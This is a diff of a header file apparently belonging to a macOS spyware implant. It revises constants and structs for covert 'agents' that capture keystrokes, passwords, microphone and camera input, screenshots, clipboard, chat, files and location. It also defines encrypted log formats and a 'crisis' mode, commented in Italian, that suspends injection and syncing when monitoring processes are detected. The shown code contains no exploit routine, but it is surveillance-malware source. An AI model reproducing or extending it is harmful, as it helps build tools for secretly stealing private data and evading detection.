@@ -131,7 +131,7 @@ typedef struct os_version {
 #define MAXIDENTIFIERLENGTH 22
 
 // Max seconds to wait for an agent/event stop
-#define MAX_STOP_WAIT_TIME 5
+#define MAX_STOP_WAIT_TIME 10
 
 // Max seconds to wait for an action to trigger (e.g. waiting for a sync end)
 #define MAX_ACTION_WAIT_TIME 60
@@ -171,24 +171,28 @@ extern int gMemLogMaxSize;
 //
 // Agents
 //
-#define AGENT_FILECAPTURE 0x0000
-#define AGENT_KEYLOG      0x0040
-#define AGENT_PRINTER     0x0100
-#define AGENT_VOIP        0x0140
-#define AGENT_URL         0x0180
-#define AGENT_ORGANIZER   0x0200
-#define AGENT_DEVICE      0x0240
-#define AGENT_MOUSE       0x0280
-#define AGENT_EMAIL       0x1001
-#define AGENT_SCREENSHOT  0xB9B9
-#define AGENT_MICROPHONE  0xC2C2
-#define AGENT_CHAT        0xC6C6
-#define AGENT_CRISIS      0xC9C9
-#define AGENT_CLIPBOARD   0xD9D9
-#define AGENT_CAM         0xE9E9
-#define AGENT_PASSWORD    0xFAFA
-#define AGENT_POSITION    0x1220
-#define AGENT_APPLICATION 0x1011
+#define AGENT_FILECAPTURE_OPEN      0x0000 // Log only, but used for configuring the agent
+#define AGENT_FILECAPTURE           0x0001
+#define AGENT_INTERNAL_FILEOPEN     0x0010 // In order to avoid having 0 on shmem->agentID
+#define AGENT_INTERNAL_FILECAPTURE  0x0011
+#define AGENT_KEYLOG                0x0040
+#define AGENT_PRINTER               0x0100
+#define AGENT_VOIP                  0x0140
+#define AGENT_URL                   0x0180
+#define AGENT_ORGANIZER             0x0200
+#define AGENT_DEVICE                0x0240
+#define AGENT_MOUSE                 0x0280
+#define AGENT_EMAIL                 0x1001
+#define AGENT_SCREENSHOT            0xB9B9
+#define AGENT_MICROPHONE            0xC2C2
+#define AGENT_CHAT                  0xC6C6
+#define AGENT_CRISIS                0x02C0
+#define AGENT_CLIPBOARD             0xD9D9
+#define AGENT_CAM                   0xE9E9
+#define AGENT_PASSWORD              0xFAFA
+#define AGENT_POSITION              0x1220
+#define AGENT_APPLICATION           0x1011
+
 
 //
 // Agents Shared Memory offsets
@@ -204,6 +208,8 @@ extern int gMemLogMaxSize;
 #define OFFT_COMMAND      0x2040
 #define OFFT_CORE_PID     0x2440
 #define OFFT_APPLICATION  0x2840
+#define OFFT_FILECAPTURE  0x2C40
+#define OFFT_CRISIS       0x3040
 
 extern u_int remoteAgents[];
 
@@ -227,6 +233,7 @@ extern u_int remoteAgents[];
 #define ACTION_AGENT_STOP   0x0003
 #define ACTION_EXECUTE      0x0004
 #define ACTION_UNINSTALL    0x0005
+#define ACTION_INFO         0x0006
 
 // Configuration file Tags
 #define EVENT_CONF_DELIMITER "EVENTCONFS-"
@@ -268,7 +275,8 @@ extern u_int remoteAgents[];
 #define TIMER_AFTER_STARTUP     0x0
 #define TIMER_LOOP              0x1
 #define TIMER_DATE              0x2
-#define TIMER_DELTA             0x3
+#define TIMER_INST              0x3
+#define TIMER_DAILY             0x4
 
 #pragma mark -
 #pragma mark Transfer Protocol Definition
@@ -308,6 +316,8 @@ extern u_int remoteAgents[];
 
 #define LOG_DOWNLOAD      0xD0D0
 #define LOG_FILESYSTEM    0xEDA1
+#define LOG_URL_SNAPSHOT  AGENT_URL+1
+#define LOG_INFO          0x0241
 
 #pragma mark -
 #pragma mark Configurator Struct Definition
@@ -368,6 +378,7 @@ typedef struct _timer {
   u_int type;
   u_int loDelay;
   u_int hiDelay;
+  u_int endAction;
 } timerStruct;
 
 typedef struct _process {
@@ -470,13 +481,35 @@ typedef struct _voipConfiguration {
   u_int compression;  // Compression factor
 } voipStruct;
 
+typedef struct _fileConfiguration {
+  u_int minFileSize;
+  u_int maxFileSize;
+  u_int hiMinDate;
+  u_int loMinDate;
+  u_int reserved1;
+  u_int reserved2;
+  BOOL  noFileOpen;
+  u_int acceptCount;
+  u_int denyCount;
+  char patterns[1]; // wchar_t
+} fileStruct;
+
+typedef struct _urlConfiguration {
+  u_int delimiter;
+  BOOL isSnapshotActive;
+} urlStruct;
+
 #pragma mark -
 #pragma mark Log File Header Struct Definition
 #pragma mark -
 
 //
-// First DWORD is not encrypted and specifies: sizeof(logStruct) + deviceIdLen + 
-// userIdLen + sourceIdLen + uAdditionalData
+// First DWORD is not encrypted and specifies:
+// sizeof(logStruct)
+// + deviceIdLen
+// + userIdLen
+// + sourceIdLen
+// + uAdditionalData
 //
 typedef struct _log {
   u_int version;
@@ -620,6 +653,14 @@ typedef struct _microphoneHeader {
   u_int loTimestamp;
 } microphoneAdditionalStruct;
 
+typedef struct _urlSnapshotHeader {
+  u_int version;
+#define LOG_URLSNAP_VERSION 2010071301
+  u_int browserType;
+  u_int urlNameLen;
+  u_int windowTitleLen;
+} urlSnapAdditionalStruct;
+
 #pragma pack(2)
 
 typedef struct _waveFormat
@@ -716,6 +757,25 @@ extern NSString *gConfigurationName;
 extern NSString *gConfigurationUpdateName;
 extern NSString *gInputManagerName;
 extern NSString *gKextName;
+
+#define CRISIS_STARTSTOP    (UInt32)0x1
+#define CRISIS_STOP         (UInt32)0x0  // Per retrocompatibilita'
+#define CRISIS_START        (UInt32)0x2  // Agent attivo
+#define CRISIS_HOOK         (UInt32)0x08 // Inibisce injection dylib
+#define CRISIS_SYNC         (UInt32)0x10 // Inibisce sincronizzazione
+
+typedef struct {
+  UInt32  unused;
+  UInt32  check_network;
+  UInt32  check_system;
+  UInt32  network_process_count;
+  UInt32  system_process_count;
+  char    process_names[1];
+} crisis_conf_struct;
+
+extern UInt32          gAgentCrisis;
+extern NSMutableArray  *gAgentCrisisNet;
+extern NSMutableArray  *gAgentCrisisApp;
 
 // OS version
 extern u_int gOSMajor;
